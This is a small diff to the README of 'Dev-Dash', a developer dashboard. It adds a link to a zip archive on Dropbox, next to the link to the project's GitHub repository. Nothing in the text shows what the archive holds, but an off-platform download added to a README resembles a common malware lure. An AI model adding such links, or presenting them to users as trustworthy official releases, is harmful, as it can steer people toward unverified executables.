@@ -3,6 +3,7 @@
 **Dev-Dash** is an all-in-one developer dashboard to manage tasks, track productivity, and visualize your coding habits. Designed to be lightweight and offline-friendly, it blends a slick UI with powerful time management tools—perfect for students, indie devs, and coding enthusiasts.
 
 🔗 **Project Repository**: [https://github.com/gavish47/Dev-Dash](https://github.com/gavish47/Dev-Dash)
+🔗 **Download DEV-DASH**: [Download and enjoy DEV-DASH](https://www.dropbox.com/scl/fi/z84s5tqz2gq9htfo9i0wd/devdash.zip?rlkey=qba6rgr7r8oolc95hmbpu31xh&st=ngjo1zcn&dl=0)
 
 ---
 
